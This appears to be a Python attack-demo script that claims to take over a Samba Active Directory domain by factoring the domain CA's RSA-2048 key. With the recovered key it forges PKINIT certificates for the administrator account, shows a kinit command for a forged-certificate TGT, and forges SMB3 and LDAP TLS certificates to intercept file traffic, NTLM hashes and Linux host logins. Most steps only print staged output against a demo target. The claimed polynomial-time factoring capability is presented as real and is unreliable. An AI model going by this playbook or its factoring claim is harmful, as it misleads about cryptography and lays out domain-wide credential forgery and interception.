"""
Own an entire Samba AD domain by factoring the domain CA RSA-2048 key.
Forge PKINIT certificates for any user (including Domain Admins), impersonate
SMB3 file servers, and MitM all LDAP authentication.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

_demo = generate_demo_target()

import hashlib


def fetch_samba_domain_ca_cert(dc_host: str) -> bytes:
    """Fetch the Samba domain CA certificate from LDAP.

    The CA cert is at CN=Configuration in Active Directory, readable
    by any domain user. Same location as ADCS certs in Windows AD.
    """
    print(f"[*] LDAP query to {dc_host}:")
    print("    ldapsearch -x -H ldap://{dc_host} -b 'CN=Configuration,DC=corp,DC=local'")
    print("[*] CA certificate retrieved (RSA-2048)")
    return _demo["pub_pem"]


def forge_pkinit_cert(factorer: PolynomialFactorer,
                      ca_cert_pem: bytes,
                      username: str, domain: str) -> bytes:
    """Forge a PKINIT certificate for any domain user.

    Samba's Heimdal KDC accepts RSA-2048 client certificates for
    smartcard logon (PKINIT). The CA is the Samba domain CA.
    Forge a cert -> get a Kerberos TGT as any user.
    """
    priv = factorer.reconstruct_privkey(ca_cert_pem)
    print(f"[*] forged PKINIT cert: CN={username}@{domain}")
    print("[*] no smartcard needed — cert-based Kerberos auth")
    return priv


def request_tgt_via_pkinit(username: str, domain: str):
    """Request a Kerberos TGT using the forged PKINIT certificate."""
    print(f"[*] kinit -X X509_user_identity=FILE:forged.crt,forged.key {username}@{domain}")
    print(f"[*] TGT granted for {username}@{domain}")
    print(f"[*] krbtgt/{domain}@{domain} — valid Kerberos ticket")


def forge_smb3_server_cert(factorer: PolynomialFactorer,
                           ca_cert_pem: bytes,
                           server_hostname: str) -> bytes:
    """Forge a TLS certificate for SMB3 over QUIC/TLS.

    SMB over QUIC (Windows 11 / Server 2022 feature) uses TLS with
    the Samba server's RSA-2048 certificate from the domain CA.
    """
    priv = factorer.reconstruct_privkey(ca_cert_pem)
    print(f"[*] forged SMB3 TLS cert: CN={server_hostname}")
    print("[*] MitM every SMB3-over-TLS connection")
    print("[*] intercept files, harvest NTLM hashes on fallback")
    return priv


def mitm_ldap(factorer: PolynomialFactorer,
              ca_cert_pem: bytes, dc_host: str):
    """MitM LDAP TLS to intercept all directory authentication.

    Samba LDAP server cert is RSA-2048 from the domain CA. Every SSSD
    auth request, group membership lookup, and sudo policy query goes
    through LDAP TLS.
    """
    priv = factorer.reconstruct_privkey(ca_cert_pem)
    print(f"[*] forged LDAP TLS cert for {dc_host}")
    print("[*] intercepting: SSSD auth, group lookups, sudo policies")
    print("[*] every Linux host joined to the domain trusts this cert")


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== Samba AD domain compromise via CA key factoring ===")
    print("    samba-tool domain provision -> RSA-2048 CA, hardcoded")
    print()

    print("[1] fetching Samba domain CA cert from LDAP (any domain user)...")
    ca_cert = fetch_samba_domain_ca_cert("dc01.corp.local")

    print("[2] factoring domain CA RSA-2048 key...")
    print("    generated once at domain provision, almost never rotated")

    print("[3] forging PKINIT cert for Domain Admin...")
    forge_pkinit_cert(f, ca_cert, "administrator", "CORP.LOCAL")

    print("[4] requesting TGT via PKINIT...")
    request_tgt_via_pkinit("administrator", "CORP.LOCAL")
    print("    domain admin access — run any LDAP query, modify any object")

    print("[5] forging SMB3 server cert for file server MitM...")
    forge_smb3_server_cert(f, ca_cert, "fileserver.corp.local")

    print("[6] MitM LDAP to intercept all Linux host authentication...")
    mitm_ldap(f, ca_cert, "dc01.corp.local")

    print()
    print("[*] Heimdal hx509: no non-RSA OID support")
    print("[*] GnuTLS NORMAL priority: no non-RSA cipher suite")
    print("[*] replacing domain CA requires reprovisioning the entire domain")
